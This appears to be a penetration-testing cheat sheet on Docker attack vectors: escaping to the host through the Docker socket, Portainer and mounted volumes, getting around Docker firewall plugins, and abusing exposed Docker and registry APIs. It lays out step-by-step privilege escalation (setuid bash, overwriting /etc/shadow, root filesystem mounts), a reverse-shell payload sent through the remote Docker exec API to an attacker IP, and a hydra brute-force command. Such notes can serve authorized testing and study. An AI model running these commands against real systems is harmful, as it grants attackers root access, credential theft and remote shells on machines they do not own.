# Docker-Related Attack Vectors

### Docker Socket

* If you have user privileges in a host machine check these:&#x20;
  * Find `netstat -tunape` docker socket in localhost
  * export it to env `export DOCKER_HOST="tcp://localhost:2222"`
  * Look docker images in host machine and run it with connecting host
    * &#x20;`docker run -it -v /:/host ubuntu:20.04 bash`
    * `cd /host/`
    * `chroot ./ bash`
    * `find / -name password`



### Portainer Web UI access

* If you have portainer access, (via leaked creds or bruteforce)
  * Create privileged docker via portainer web UI&#x20;
  * Later connect there via from web ui of portainer:
    * `mount /dev/sda /mnt`
    * `cd /mnt`
    * `chroot ./ bash`
    * Then find credentials in root mounted&#x20;

### Use Case (Blocked by privileged mode but run in seccomp)

* You are user in victim machine and want to get root and blocked by docker firewall when you run `docker run -d --privileged ubuntu:latest`

Then you can run&#x20;

* `docker run -d --security-opt "seccomp=unconfined" modified-ubuntu`
* With that way we can start a container with seccomp profile set to unconfined.
*   `docker exec -it --privileged {container_id} bash`

    * `Check it with capsh --print`

    Then use [cap\_sys\_module](../container-breakouts/#cap\_sys\_module-capability) breakout technique to breakout the container.&#x20;

### Use Case (Blocked by Docker Firewall Api )

In that case you are user in host machine and by using docker trying to get root user.&#x20;

Check that command&#x20;

`docker run -it --privileged ubuntu:18.04 bash`&#x20;

If it is blocked by Docker Firewall then&#x20;

`cp /bin/bash /tmp/`

`docker run -it -v /tmp:/host ubuntu:18.04 bash`

in docker

`chown root:root /host/bash`

`chmod u+s /host/bash`

then `exit`

in host machine it self run&#x20;

`/tmp/bash -p`

your effective uid is 0.&#x20;

### Use Case (Blocked by Docker Firewall Api - 2 )

In that case you are user in host machine and by using docker trying to get root user.&#x20;

Check that command&#x20;

`docker run -it --privileged ubuntu:18.04 bash`&#x20;

If it is blocked by Docker Firewall then&#x20;

`test it with /tmp, /etc,`&#x20;

`docker run -it -v /etc:/host ubuntu:18.04 bash`

Check /host directory

then create password entry with openssl&#x20;

`openssl passwd -1 -salt abc abc`

take that string and put in /host/shadow puth that string in root place.&#x20;

then exit from docker and in host machine be root with the password that you have written in openssl command.



### Use Case (Blocked by Docker Firewall Api - 3 \[Using Docker API])

In that case you are user in host machine and by using docker trying to get root user.&#x20;

Check that command&#x20;

`docker run -it --privileged ubuntu:18.04 bash`&#x20;

If it is blocked by Docker Firewall then&#x20;

* When docker client is used, docker client interacts with the docker socket by using the HTTP API, the JSON data sent by docker client follows the JSON format mentioned on the docker API references. Identify the API version used by the docker client.
* [https://docs.docker.com/engine/api/v1.40/#tag/Container/operation/ContainerCreate](https://docs.docker.com/engine/api/v1.40/#tag/Container/operation/ContainerCreate)

So by sending request to docker socket we can get in contact with docker.&#x20;

Send that request with curl&#x20;

`curl --unix-socket /var/run/docker.sock -H "Content-Type: application/json" -d '{"Image": "ubuntu", "Binds":["/:/host"]}' http:/v1.40/containers/create`

and it will create us a privileged container via API request

check it via

`docker ps -a`

start the container `docker start container_id`

and&#x20;

run `docker exec -it container_id bash`

now check host directory and you are in host machine.&#x20;



### Some Docker Rest API Commands that can be used

```
#Interact with the docker socket using curl and send a request to create a container.
#Specify “CAP_SYS_MODULE” value in the capability attribute.


curl --unix-socket /var/run/docker.sock -H "Content-Type: application/json" -d
'{"Image": "modified-ubuntu", "HostConfig":{"Capabilities":["CAP_SYS_MODULE"]}}'
http:/v1.40/containers/create

# Don't forget to check docker port 2375 and later add that 
export DOCKER_HOST="tcp://localhost:2375"

# if you find bypass-token 
# check images

curl -X GET -H "Content-Type: application/json" -H "Bypass-Token:
Token" http://Remote_IP:2375/images/json -s | jq

# Create a container from image and mount the root file in /host directory

curl -s -H "Content-Type: application/json" -H "Bypass-Token:
0a46f8ef7ba0611ccb16a0aeeac618a1" -d '{"Image":
"wolfcms","Env":["Bypass-Token=0a46f8ef7ba0611ccb16a0aeeac618a1"],"Binds":["/:/host"]}'
http://Remote_IP:2375/containers/create | jq

#Start that container

curl -X POST -H "Content-Type: application/json" -H "Bypass-Token:
0a46f8ef7ba0611ccb16a0aeeac618a1"
http://Remote_IP:2375/containers/0bb824614788cced1fa17ed4539477bca425b62d9d52d91
8ff3c423a3f305d56/start

# Running containers

curl -X GET -H "Content-Type: application/json" -H "Bypass-Token:
0a46f8ef7ba0611ccb16a0aeeac618a1" http://Remote_IP:2375/containers/json -s | jq

# Reverse shell bash send with curl

curl -s -H "Content-Type: application/json" -H "Bypass-Token:
0a46f8ef7ba0611ccb16a0aeeac618a1" -d '{"AttachStdin":
false,"AttachStdout":false,"AttachStderr":false,"Cmd":["bash","-c","bash -i >&
/dev/tcp/Local_IP/4444 0>&1"],"Detach":true}'
http://Remote_IP:2375/containers/0bb824614788cced1fa17ed4539477bca425b62d9d52d91
8ff3c423a3f305d56/exec | jq


#
/v2/_catalog
/v2/alpine/tags/list
/v2/alpine/manifests/latest  
curl remote_ip:port/v2/alpine/blobs/sha256:2a62ecb2a3e5bcdbac8b6edc58fae093a39381e05d08ca75ed27cae94125f935 --output 1.tar

#if there is basic auth on the endpint 
hydra -l {username} -P wordlist REMOTE-IP -s 5000 https-get

```



